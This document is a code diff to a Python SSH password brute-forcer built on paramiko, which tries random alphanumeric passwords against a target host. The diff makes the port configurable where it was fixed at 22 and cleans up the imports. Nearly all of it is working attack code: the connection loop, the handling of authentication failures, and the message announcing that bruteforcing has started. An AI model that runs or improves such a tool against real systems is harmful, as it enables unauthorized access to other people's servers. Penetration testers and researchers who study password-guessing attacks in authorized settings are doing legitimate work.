@@ -1,8 +1,7 @@
 from socket import *
-import sys, time
+import sys, time, paramiko, os, socket
 from random import randint
-import paramiko, sys, os, socket
-global host, username, line, input_file, chars
+global host, username, port, chars
 
 chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
 used = []
@@ -41,7 +40,7 @@ def ssh_connect(password, code = 0):
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 	try:
-		ssh.connect(host, port = 22, username = username, password = password)
+		ssh.connect(host, port = port, username = username, password = password)
 	except paramiko.AuthenticationException:
 		code = 1
 	except socket.error:
@@ -50,10 +49,10 @@ def ssh_connect(password, code = 0):
 	return(code)
 
 if isopen != True:
-	print("[-] Port 22 is not open.")
+	print("[-] Port %s is not open." % (port))
 	sys.exit(1)
 else:
-	print("[*] Port 22 open, bruteforcing...")
+	print("[*] Port %s open, bruteforcing..." % (port))
 
 while True:
 	no = randint(0, 61)
